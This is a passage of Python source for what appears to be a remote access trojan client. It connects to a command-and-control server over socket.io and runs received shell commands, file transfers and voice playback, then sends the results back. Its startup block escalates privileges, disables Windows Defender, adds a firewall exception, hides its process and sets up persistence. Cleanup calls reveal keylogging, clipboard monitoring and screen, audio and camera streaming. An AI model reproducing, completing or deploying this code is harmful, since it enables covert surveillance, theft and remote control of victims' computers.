        "stop-clipboard": stop_clipboard_monitor,
    }

    if command in internal_commands:
        output = internal_commands[command]()
    elif command.startswith("upload-file:"):
        output = handle_file_upload(command.split(":", 2))
    elif command.startswith("download-file:"):
        output = handle_file_download(command.split(":", 1), agent_id)
    elif command.startswith("play-voice:"):
        output = handle_voice_playback(command.split(":", 1))
    elif command != "sleep":
        output = execute_command(command)
    else:
        output = "[No output from command]"
    
    # Always emit command result, even if no output
    if output is None:
        output = "[No output from command]"
    
    sio.emit('command_result', {'agent_id': agent_id, 'output': output})
    print(f"🔍 Makoy: Sent command result for '{command}': {output[:100]}...")

if __name__ == "__main__":
    if WINDOWS_AVAILABLE:
        if not is_admin():
            elevate_privileges()
        disable_defender()
        add_firewall_exception()
        hide_process()
        establish_persistence()
    add_to_startup()
    agent_id = get_or_create_agent_id()
    print(f"Agent starting with ID: {agent_id}")
    
    while True:
        try:
            sio.connect(SERVER_URL)
            sio.wait()
        except socketio.exceptions.ConnectionError:
            print("Connection failed. Retrying in 10 seconds...")
            time.sleep(10)
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            stop_streaming()
            stop_audio_streaming()
            stop_camera_streaming()
            stop_keylogger()
            stop_clipboard_monitor()
            print("Cleaned up resources. Retrying in 10 seconds...")
            time.sleep(10)
